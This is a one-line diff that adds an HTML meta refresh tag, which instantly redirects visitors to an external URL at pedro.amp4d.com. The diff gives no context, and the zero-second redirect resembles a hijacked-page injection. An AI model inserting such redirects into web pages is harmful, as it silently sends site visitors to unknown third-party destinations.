@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0; url=https://pedro.amp4d.com/naga88">
